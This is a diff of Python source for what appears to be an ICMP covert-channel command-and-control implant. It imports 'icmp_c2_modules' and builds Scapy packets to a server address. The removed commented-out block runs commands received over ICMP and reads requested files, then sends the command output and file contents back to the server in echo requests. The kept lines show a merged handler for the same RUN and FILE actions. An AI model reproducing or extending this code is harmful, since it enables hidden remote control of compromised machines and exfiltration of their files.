@@ -1,8 +1,6 @@
 
 from icmp_c2_modules import *
 
-
-
 cond = 0
 
 def read_file(file_name):
@@ -27,25 +25,6 @@ def parse_packet(packet):
         prefix_packet = check_prefix(packet)     
         data_recieved = extract_data(packet)
         pkt_no_data = IP(dst=SERVER_ADR)/ICMP(type="echo-request")
-        
-        # if prefix_packet == RUN:
-        #     print("i am in run module!:")
-        #     txt_recieved = bin_to_str(data_recieved)
-        #     print("command is: " + txt_recieved)
-        #     output = RunCommand(txt_recieved)
-        #     #bin_output = str_to_binary(output) 
-        #     bin_output = bytes(output.encode())
-        #     pkt_send(pkt_no_data,BEGIN_OUTPUT + data_recieved,0)
-        #     pkt_send(pkt_no_data,bin_output,1)
-        #     pkt_send(pkt_no_data,EF,0)
-        # elif prefix_packet == FILE:
-        #     print("i am in file module!:")
-        #     txt_recieved = bin_to_str(data_recieved)
-        #     print("file name is: " +txt_recieved )
-        #     output = read_file(txt_recieved)   # read in binary mode
-        #     pkt_send(pkt_no_data,BEGIN_FILE + data_recieved,0)
-        #     pkt_send(pkt_no_data,output,1)
-        #     pkt_send(pkt_no_data,EF,0)
         
         if prefix_packet == RUN or prefix_packet == FILE:
             txt_recieved = bin_to_str(data_recieved)
